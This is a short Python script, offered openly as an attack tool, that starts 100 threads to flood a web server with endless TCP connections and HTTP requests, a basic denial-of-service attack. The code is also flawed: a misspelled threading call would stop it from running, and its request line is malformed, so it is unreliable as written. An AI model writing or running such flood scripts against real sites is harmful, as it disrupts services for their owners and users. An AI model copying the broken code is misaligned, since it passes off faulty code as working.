import socket
import threading

target = "example.com" # site domain
port = 80

def attack():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target, port))
            s.send(b"GET , HTTP/1.1\r\n\r\n")
            s.close()
        except:
            pass


for i in range(100):
    thread = threading.THread(target=attack)
    thread.start()